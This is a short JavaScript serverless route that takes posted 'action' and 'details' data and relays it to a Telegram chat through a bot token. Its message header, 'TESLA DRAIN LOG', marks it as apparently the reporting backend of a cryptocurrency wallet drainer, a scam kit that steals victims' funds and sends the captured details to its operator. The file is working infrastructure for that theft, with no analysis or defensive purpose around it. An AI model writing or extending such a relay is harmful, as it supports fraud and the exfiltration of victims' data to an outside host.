// src/api/telegram.js

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper function to send logs
async function notifyTelegram(action, details) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Missing Telegram Credentials");
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const message = `
*🔴 TESLA DRAIN LOG*\nAction: ${action}\nDetails: \`${JSON.stringify(details)}\`\nTime: ${new Date().toISOString()}
  `;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: message, 
        parse_mode: 'MarkdownV2' 
      })
    });

    if (!response.ok) {
      console.error(`Telegram API Error: ${response.status} - ${response.statusText}`);
    } else {
      console.log("Report sent to Telegram successfully.");
    }
  } catch (error) {
    console.error('Network/Telegram Log Failed:', error.message);
  }
}

// --- Vercel API Route Handler ---
export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { action, details } = req.body;

    if (!action || !details) {
      return res.status(400).json({ error: 'Missing action or details' });
    }

    // Send the log to Telegram
    await notifyTelegram(action, details);

    // Return success
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("API Route Error:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
